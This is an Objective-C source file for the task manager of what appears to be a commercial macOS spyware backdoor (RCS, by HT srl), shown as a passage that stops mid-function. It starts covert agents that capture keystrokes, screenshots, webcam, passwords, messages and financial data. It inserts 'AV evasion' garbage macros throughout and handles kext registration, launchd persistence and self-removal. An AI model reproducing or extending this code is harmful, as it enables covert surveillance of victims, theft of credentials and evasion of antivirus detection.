/*
 * RCSMac - Task Manager
 *  This class will be responsible for managing all the operations within
 *  Events/Actions/Agents, thus the Core will have to deal with them in the
 *  most generic way.
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <sys/ipc.h>
#import <sys/ioctl.h>

#import "RCSMCommon.h"
#import "RCSMAgentScreenshot.h"
#import "RCSMAgentWebcam.h"
#import "RCSMAgentOrganizer.h"

#import "RCSMAgentPosition.h"
#import "RCSMAgentDevice.h"

#import "RCSMAgentMicrophone.h"

#import "RCSMAgentMessages.h"
#import "RCSMAgentPassword.h"
#import "RCSMAgentMoney.h"
#import "RCSMAgentChat.h"

#import "NSMutableDictionary+ThreadSafe.h"

#import "RCSMInfoManager.h"
#import "RCSMSharedMemory.h"
#import "RCSMTaskManager.h"
#import "RCSMConfManager.h"
#import "RCSMLogManager.h"
#import "RCSMActions.h"
#import "RCSMEvents.h"
#import "RCSMDiskQuota.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

#define MAX_RETRY_TIME     6

static __m_MTaskManager *sharedTaskManager = nil;
static NSLock *gTaskManagerLock           = nil;
static NSLock *gSyncLock                  = nil;

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation __m_MTaskManager

@synthesize mEventsList;
@synthesize mActionsList;
@synthesize mAgentsList;
@synthesize mBackdoorID;
@synthesize mBackdoorControlFlag;
@synthesize mShouldReloadConfiguration;
@synthesize mIsSyncing;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MTaskManager *)sharedInstance
{
@synchronized(self)
  {
    if (sharedTaskManager == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedTaskManager;
}

+ (id)allocWithZone: (NSZone *)aZone
{
@synchronized(self)
  {
    if (sharedTaskManager == nil)
      {
        sharedTaskManager = [super allocWithZone: aZone];
      
        //
        // Assignment and return on first allocation
        //
        return sharedTaskManager;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
    {
      if (sharedTaskManager != nil)
        {
          self = [super init];
          
          if (self != nil)
            {
              mEventsList   = [[NSMutableArray alloc] init];
              mActionsList  = [[NSMutableArray alloc] init];
              mAgentsList   = [[NSMutableArray alloc] init];
              
              mShouldReloadConfiguration = FALSE;
              
              mConfigManager = [[__m_MConfManager alloc] initWithBackdoorName:
                                [[[NSBundle mainBundle] executablePath] lastPathComponent]];
              
              mActions = [[__m_MActions alloc] init];
              gTaskManagerLock  = [[NSLock alloc] init];
              mIsSyncing        = NO;
              sharedTaskManager = self;
            }
        }
    }
  
  return sharedTaskManager;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Generic backdoor operations
#pragma mark -

- (BOOL)loadInitialConfiguration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([mConfigManager loadConfiguration] == YES)
    {
      //
      // Start all the enabled agents
      //
      [self startAgents];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
#ifdef DEBUG_TASK_MANAGER
      infoLog(@"All Agents started");
#endif
      
      //
      // Start events monitoring
      //
      [self eventsMonitor];
      
//      [NSThread detachNewThreadSelector: @selector(eventsMonitor)
//                               toTarget: self
//                             withObject: nil];
      
    }
  else
    {
#ifdef DEBUG_TASK_MANAGER
      errorLog(@"An error occurred while loading the configuration file");
#endif

      exit(-1);
    }
  
  [outerPool release];
  return TRUE;
}

// FIXED-
- (BOOL)shouldMigrateConfiguration: (NSString*)migrationConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: migrationConfiguration] == TRUE)
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      if ([mConfigManager checkConfigurationIntegrity: migrationConfiguration])
        {   
          NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
                                         [[NSBundle mainBundle] bundlePath],
                                         gConfigurationName];
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
                                                         error: nil])
            {
              
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              if ([[NSFileManager defaultManager] moveItemAtPath: migrationConfiguration
                                                          toPath: configurationPath
                                                           error: nil])
                {
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_001
                  
                  [configurationPath release];
                  return TRUE;
                }
            }
            
          [configurationPath release];
        }
    }
  
  return FALSE;
}

- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
{  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
                                 [[NSBundle mainBundle] bundlePath],
                                 gConfigurationName];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSString *configurationUpdatePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                       [[NSBundle mainBundle] bundlePath],
                                       gConfigurationUpdateName];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: configurationUpdatePath] == TRUE)
    {
      [[NSFileManager defaultManager] removeItemAtPath: configurationUpdatePath
                                                 error: nil];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [aConfigurationData writeToFile: configurationUpdatePath
                       atomically: YES];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if ([mConfigManager checkConfigurationIntegrity: configurationUpdatePath])
    {   
      // If we're here it means that the file is ok thus it is safe to replace
      // the original one
      if ([[NSFileManager defaultManager] removeItemAtPath: configurationPath
                                                     error: nil])
      {  
        // AV evasion: only on release build
        AV_GARBAGE_005
        
          if ([[NSFileManager defaultManager] moveItemAtPath: configurationUpdatePath
                                                      toPath: configurationPath
                                                       error: nil])
            {
              self.mShouldReloadConfiguration = YES;
              
              [configurationPath release];
              [configurationUpdatePath release];
              
              return TRUE;
            }
        }
    }
  else
    {
      // In case of errors remove the temp file
      [[NSFileManager defaultManager] removeItemAtPath: configurationUpdatePath
                                                 error: nil];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
      [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
      [infoManager release];
    }
  
  [configurationPath release];
  [configurationUpdatePath release];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  return FALSE;
}

- (BOOL)reloadConfiguration
{  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (mShouldReloadConfiguration == YES)
    {
      mShouldReloadConfiguration = NO;
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      //
      // Now stop all the agents and reload configuration
      //
      if ([self stopEvents] == TRUE)
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Events stopped correctly");
#endif
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          if ([self stopAgents] == TRUE)
            {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Agents stopped correctly");
#endif
              
              // AV evasion: only on release build
              AV_GARBAGE_009
              
              //
              // Now reload configuration
              //
              if ([mConfigManager loadConfiguration] == YES)
                {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"loadConfiguration was ok");
#endif
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_008
                  
                  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
                  [infoManager logActionWithDescription: @"New configuration activated"];
                  [infoManager release];
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                  
                  // Clear the command shared memory
                  [gSharedMemoryCommand zeroFillMemory];
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_006
                  
                  // Clear the log shared memory from the configurations
                  [gSharedMemoryLogging clearConfigurations];
                  
                  //
                  // Start agents
                  //
                  [self startAgents];
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Started Agents");
#endif
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_003
                  
                  //
                  // Start event thread here
                  //
                  [self eventsMonitor];
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Started Events Monitor");
#endif
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_002
                  
                }
              else
              {  
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                  // previous one
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"An error occurred while reloading the configuration file");
#endif
                  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
                  [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
                  [infoManager release];

                  return NO;
                }
            }
        }
    }
  
  return YES;
}

- (void)uninstallMeh
{  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [gControlFlagLock lock];
  mBackdoorControlFlag = @"STOP";
  [gControlFlagLock unlock];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  BOOL lckRet = NO;
  lckRet = [gSuidLock lockBeforeDate: [NSDate dateWithTimeIntervalSinceNow: 60]];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
#ifdef DEBUG_TASK_MANAGER
  if (lckRet == NO) 
    {
      verboseLog(@"enter critical session with timeout [euid/uid %d/%d]", 
                 geteuid(), getuid());
    }
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  //
  // Stop all events
  //
  //if ([self stopEvents] == NO)
    //{
//#ifdef DEBUG_TASK_MANAGER
      //errorLog(@"Error while stopping events");
//#endif
    //}
  //else
    //{
//#ifdef DEBUG_TASK_MANAGER
      //infoLog(@"Events stopped correctly");
//#endif
    //}
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  //
  // Stop all agents
  //
  if ([self stopAgents] == NO)
    {
#ifdef DEBUG_TASK_MANAGER
      errorLog(@"Error while stopping agents");
#endif
    }
                    
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  __m_MLogManager *_logManager  = [__m_MLogManager sharedInstance];
 
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([_logManager closeActiveLogsAndContinueLogging: NO])
    {
#ifdef DEBUF
      infoLog(@"Active logs closed correctly");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSString *backdoorPlist = createLaunchdPlistPath();
  //
  // Remove the LaunchDaemon plist
  //
  [[NSFileManager defaultManager] removeItemAtPath: backdoorPlist
                                             error: nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  int activeBackdoors = 1;

#ifndef NO_KEXT
  int kextFD  = open(BDOR_DEVICE, O_RDWR);
  int ret     = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  //
  // Get the number of active backdoors since we won't remove the
  // input manager if there's even one still registered
  //
  ret = ioctl(kextFD, MCHOOK_GET_ACTIVES, &activeBackdoors);
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //
  // Unregister from kext
  //
  const char *userName = [NSUserName() UTF8String];
  ret = ioctl(kextFD, MCHOOK_UNREGISTER, userName);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  // Just ourselves
  if (activeBackdoors == 1)
    {
      NSString *destDir = nil;
      NSError *err;
      NSString *osaxRootPath = nil;
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      if (getuid() == 0 || geteuid() == 0)
        {
          if ([gUtil isLeopard])
            {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Removing input manager");
#endif  
              // AV evasion: only on release build
              AV_GARBAGE_003
              
              destDir = [[NSString alloc]
                initWithFormat: @"/%@/%@/%@", LIBRARY_NSSTRING, IM_FOLDER, IM_NAME];
              
              // AV evasion: only on release build
              AV_GARBAGE_004
              
              if (![[NSFileManager defaultManager] removeItemAtPath: destDir
                                                              error: &err])
                {
#ifdef DEBUG_TASK_MANAGER
                  errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
                  errorLog(@"Error while removing the xpc service");
                  errorLog(@"error: %@", [err localizedDescription]);
#endif
                }

              [destDir release];
            }
          else
          {  
            // AV evasion: only on release build
            AV_GARBAGE_002
            
              // is Snow Leopard
              osaxRootPath = [[NSString alloc] initWithFormat:@"/%@/%@/%@", 
                                                              LIBRARY_NSSTRING, 
                                                              OSAX_FOLDER, 
                                                              OSAX_NAME];
//XXX- for av problem
//              if ([gUtil isLion])
//                {
//                  destDir = [[NSString alloc]
//                    initWithFormat: @"%@/%@%@.xpc",
//                    XPC_BUNDLE_FRAMEWORK_PATH,
//                    XPC_BUNDLE_FOLDER_PREFIX,
//                    gMyXPCName];
//#ifdef DEBUG_TASK_MANAGER
//                  infoLog(@"Removing xpc services %@", destDir);
//#endif
//                  if (![[NSFileManager defaultManager] removeItemAtPath: destDir
//                                                                  error: &err])
//                    {
//#ifdef DEBUG_TASK_MANAGER
//                      errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
//                      errorLog(@"Error while removing the xpc service");
//                      errorLog(@"error: %@", [err localizedDescription]);
//#endif
//                    }
//
//                  [destDir release];
//                }
            }
        }
      else
        {
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@/%@/%@",
                       NSUserName(), LIBRARY_NSSTRING, OSAX_FOLDER, OSAX_NAME];
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      // if not leopard remove osax
      if (osaxRootPath != nil)
        {  
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          [[NSFileManager defaultManager] removeItemAtPath: osaxRootPath
                                                     error: &err];
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          [osaxRootPath release];
        }
      
    }

#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Removing SLI Plist just in case");
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [gUtil removeBackdoorFromSLIPlist];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  //
  // Remove our working dir
  //
  if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                                 error: nil])
    {
#ifdef DEBUG_TASK_MANAGER
      infoLog(@"Backdoor dir removed correctly");
#endif
    }
  else
    {
#ifdef DEBUG_TASK_MANAGER
      infoLog(@"An error occurred while removing backdoor dir");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [gSharedMemoryCommand detachFromMemoryRegion];

#ifdef DEMO_VERSION
  changeDesktopBackground(@"/Library/Desktop Pictures/Aqua Blue.jpg", TRUE);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_001

#ifndef NO_KEXT
  close(kextFD);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  //
  // Unload our service from LaunchDaemon
  //
  NSArray *_commArguments = [[NSArray alloc] initWithObjects:
                             @"remove",
                             [[backdoorPlist lastPathComponent]
                              stringByDeletingPathExtension],
                             nil];
  
  [gUtil executeTask: @"/bin/launchctl"
       withArguments: _commArguments
        waitUntilEnd: YES];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  sleep(3);
  [gSuidLock unlock];

#ifdef DEBUG_TASK_MANAGER
  verboseLog(@"exit critical session [euid/uid %d/%d]", 
             geteuid(), getuid());
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // FIXED-
  if (gIsDemoMode == YES)
    changeDesktopBg(nil, YES);
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  exit(0);
}

#pragma mark -
#pragma mark Agents
#pragma mark -

- (id)initAgent: (u_int)agentID
{
  return FALSE;
}

- (BOOL)startAgent: (u_int)agentID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // Disable agent start on global quota exceded
  if ([[__m_MDiskQuota sharedInstance] isQuotaReached] == YES)
    return NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  __m_MLogManager *_logManager  = [__m_MLogManager sharedInstance];
  
  NSMutableDictionary *agentConfiguration = nil;
  NSMutableData *agentCommand             = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  switch (agentID)
    {
        case AGENT_MONEY:
        {
            // AV evasion: only on release build
            AV_GARBAGE_002
            
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Starting Agent Money");
#endif
            __m_MAgentMoney *agentMoney = [__m_MAgentMoney sharedInstance];
            agentConfiguration = [[self getConfigForAgent: agentID] retain];
            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            if (agentConfiguration != nil)
            {
                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
                    && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
                {
                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
                    [agentMoney setAgentConfiguration: agentConfiguration];
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentMoney
                                           withObject: nil];
                }
                else
                {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Agent Screenshot is already running");
#endif
                }
            }
            else
            {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Agent not found");
#endif
                return FALSE;
            }
        }
            break;
        case AGENT_PASSWORD:
        {
            // AV evasion: only on release build
            AV_GARBAGE_002
            
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Starting Agent Password");
#endif
            __m_MAgentPassword *agentPassword = [__m_MAgentPassword sharedInstance];
            agentConfiguration = [[self getConfigForAgent: agentID] retain];
            
            // AV evasion: only on release build
            AV_GARBAGE_001
 
            if (agentConfiguration != nil)
            {
                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
                    && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
                {
                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
                    [agentPassword setAgentConfiguration: agentConfiguration];
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentPassword
                                           withObject: nil];
                }
                else
                {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Agent Screenshot is already running");
#endif
                }
            }
            else
            {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Agent not found");
#endif
                return FALSE;
            }
        }
        break;
        case AGENT_MESSAGES:
        {
            // AV evasion: only on release build
            AV_GARBAGE_002
            
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Starting Agent Messages");
#endif
            __m_MAgentMessages *agentMessages = [__m_MAgentMessages sharedInstance];
            agentConfiguration = [[self getConfigForAgent: agentID] retain];
            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            if (agentConfiguration != nil)
            {
                if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
                    && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
                {
                    [agentConfiguration setObject: AGENT_START forKey: @"status"];
                    [agentMessages setAgentConfiguration: agentConfiguration];
                    [NSThread detachNewThreadSelector: @selector(start)
                                             toTarget: agentMessages
                                           withObject: nil];
                }
                else
                {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Agent Screenshot is already running");
#endif
                }
            }
            else
            {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Agent not found");
#endif
                return FALSE;
            }
        }
        break;
    case AGENT_SCREENSHOT:
        {
          // AV evasion: only on release build
          AV_GARBAGE_004
        
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Starting Agent Screenshot");
#endif
          __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
          agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
          if (agentConfiguration != nil)
          {
              if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
                  && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
              {
                  [agentConfiguration setObject: AGENT_START forKey: @"status"];
                  [agentScreenshot setAgentConfiguration: agentConfiguration];
                  [NSThread detachNewThreadSelector: @selector(start)
                                         toTarget: agentScreenshot
                                       withObject: nil];
              }
              else
              {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Agent Screenshot is already running");
#endif
              }
          }
          else
          {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Agent not found");
#endif
              return FALSE;
          }
        }
        break;
    case AGENT_ORGANIZER:
      {  
          // AV evasion: only on release build
          AV_GARBAGE_002
        
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Starting Agent Organizer");
#endif
          __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
          agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
          // AV evasion: only on release build
          AV_GARBAGE_001
        
          if (agentConfiguration != nil)
          {
              if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING]
                  && ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
              {
                  [agentConfiguration setObject: AGENT_START forKey: @"status"];
                  [agentOrganizer setAgentConfiguration: agentConfiguration];
                  
                  [NSThread detachNewThreadSelector: @selector(start)
                                           toTarget: agentOrganizer
                                         withObject: nil];
              }
              else
              {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Agent Screenshot is already running");
#endif
              }
          }
          else
          {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Agent not found");
#endif
              return FALSE;
          }
        }
        break;
    case AGENT_CAM:
        {
          // AV evasion: only on release build
          AV_GARBAGE_000
        
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Starting Agent Webcam");
#endif
          __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
        
          // AV evasion: only on release build
          AV_GARBAGE_009
        
          agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
          if (agentConfiguration != nil)
          {
              if (![[agentConfiguration objectForKey: @"status"] isEqualToString:AGENT_RUNNING] &&
            ![[agentConfiguration objectForKey: @"status"] isEqualToString:AGENT_START])
              {
                  // AV evasion: only on release build
                  AV_GARBAGE_008
          
                  [agentConfiguration setObject: AGENT_START forKey: @"status"];
            
                  [agentWebcam setAgentConfiguration: agentConfiguration];
          
                  // AV evasion: only on release build
                  AV_GARBAGE_007
          
//            [NSThread detachNewThreadSelector: @selector(start)
//                                     toTarget: agentWebcam
//                                   withObject: nil];
                  [agentWebcam performSelectorOnMainThread:@selector(start) withObject:nil waitUntilDone:FALSE];
              }
              else
              {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Agent Webcam is already running");
#endif
              }
          }
          else
          {
#ifdef DEBUG_TASK_MANAGER
              infoLog(@"Agent Webcam not found");
#endif
              return FALSE;
          }
        }
        break;
    case AGENT_KEYLOG:
      {  
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        if (![[agentConfiguration objectForKey: @"status"] isEqualToString:AGENT_RUNNING] &&
            ![[agentConfiguration objectForKey: @"status"] isEqualToString:AGENT_START])
        {
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID   = agentID;
            shMemoryHeader->direction = D_TO_AGENT;
            shMemoryHeader->command   = AG_START;
            
            // AV evasion: only on release build
            AV_GARBAGE_002
            
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"Creating KEYLOG Agent log file");
#endif
            BOOL success = [_logManager createLog: AGENT_KEYLOG
                                      agentHeader: nil
                                        withLogID: 0];
            
            // AV evasion: only on release build
            AV_GARBAGE_004
            
            if (success == TRUE)
              {
#ifdef DEBUG_TASK_MANAGER
                infoLog(@"Starting Agent Keylogger");
#endif
                
                // AV evasion: only on release build
                AV_GARBAGE_001
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_KEYLOG
                                        fromComponent: COMP_CORE] == TRUE)
                {
                    [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Start command sent to Agent Keylog", agentID);
#endif
                }
                else
                {
#ifdef DEBUG_TASK_MANAGER
                    infoLog(@"Error while sending start command to the agent");
#endif
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_007
                    
                    [agentCommand release];
                    [agentConfiguration release];
                    return NO;
                }
              }
          }
        break;
      }
    case AGENT_URL:
      {  
        // AV evasion: only on release build
        AV_GARBAGE_001
        
#ifdef DEBUG_TASK_MANAGER
        infoLog(@"Starting Agent URL");
#endif
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];
        
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
        {  
            // AV evasion: only on release build
            AV_GARBAGE_003
          
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID = agentID;
            shMemoryHeader->direction = D_TO_AGENT;
            shMemoryHeader->command = AG_START;
          
            // AV evasion: only on release build
            AV_GARBAGE_004
          
            NSMutableData *urlConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
            NSData *agentConf = [agentConfiguration objectForKey: @"data"];
          
            // AV evasion: only on release build
            AV_GARBAGE_005
          
            shMemoryLog *_urlConfig     = (shMemoryLog *)[urlConfig bytes];
            _urlConfig->status          = SHMEM_WRITTEN;
            _urlConfig->agentID         = AGENT_URL;
            _urlConfig->direction       = D_TO_AGENT;
            _urlConfig->commandType     = CM_AGENT_CONF;
            _urlConfig->commandDataSize = [agentConf length];
          
            // AV evasion: only on release build
            AV_GARBAGE_003
          
            memcpy(_urlConfig->commandData,
                   [agentConf bytes],
                   [agentConf length]);
          
            // AV evasion: only on release build
            AV_GARBAGE_007
          
            if ([gSharedMemoryLogging writeMemory: urlConfig
                                           offset: 0
                                    fromComponent: COMP_CORE] == TRUE)
            {
                
                // AV evasion: only on release build
                AV_GARBAGE_008
                
                BOOL success = [_logManager createLog: AGENT_URL
                                          agentHeader: nil
                                            withLogID: 0];
                
                // AV evasion: only on release build
                AV_GARBAGE_007
                
                if (success == TRUE)
                {
                    if ([gSharedMemoryCommand writeMemory: agentCommand
                                                   offset: OFFT_URL
                                            fromComponent: COMP_CORE] == TRUE)
                    {
                        [agentConfiguration setObject: AGENT_RUNNING
                                               forKey: @"status"];
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"Start command sent to Agent URL", agentID);
#endif
                    }
                    else
                    {
#ifdef DEBUG_TASK_MANAGER
                        infoLog(@"An error occurred while starting agent URL");
#endif

                    [agentCommand release];
                    [agentConfiguration release];
                    return NO;
                    }
                }
            }
            else
            {
#ifdef DEBUG_TASK_MANAGER
                errorLog(@"Error while sending configuration to Agent URL");
#endif
            }
        }
        break;
      }
    case AGENT_APPLICATION:
      {  
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [[self getConfigForAgent: agentID] retain];

        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
          {  
            // AV evasion: only on release build
            AV_GARBAGE_003
          
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID   = agentID;
            shMemoryHeader->direction = D_TO_AGENT;
            shMemoryHeader->command   = AG_START;

            
            // AV evasion: only on release build
            AV_GARBAGE_001
            
            BOOL success = [_logManager createLog: AGENT_APPLICATION
                                      agentHeader: nil
                                        withLogID: 0];

            if (success == TRUE)
              {                
                // AV evasion: only on release build
                AV_GARBAGE_003
                
                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_APPLICATION
                                        fromComponent: COMP_CORE] == TRUE)
                  {
                    [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_002
                    
                  }
                else
                  {
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_003                    

                    [agentCommand release];
                    [agentConfiguration release];
                    return NO;
                  }
              }
          }
        break;
      }
    case AGENT_MOUSE:
      {  
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
        agentConfiguration = [self getConfigForAgent: agentID];
        
        // AV evasion: only on release build
        AV_GARBAGE_009
        
        if (![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_RUNNING] &&
            ![[agentConfiguration objectForKey: @"status"] isEqualToString: AGENT_START])
          {   
            
            // AV evasion: only on release build
            AV_GARBAGE_008
            
            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
            shMemoryHeader->agentID     = AGENT_MOUSE;
            shMemoryHeader->direction   = D_TO_AGENT;
            shMemoryHeader->command     = AG_START;
            
            NSMutableData *mouseConfig = [NSMutableData dataWithLength: sizeof(shMemoryLog)];
            NSData *agentConf = [agentConfiguration objectForKey: @"data"];
            
            // AV evasion: only on release build
            AV_GARBAGE_007
            
            shMemoryLog *_mouseConfig     = (shMemoryLog *)[mouseConfig bytes];
            _mouseConfig->status          = SHMEM_WRITTEN;
            _mouseConfig->agentID         = AGENT_MOUSE;
            _mouseConfig->direction       = D_TO_AGENT;
            _mouseConfig->commandType     = CM_AGENT_CONF;
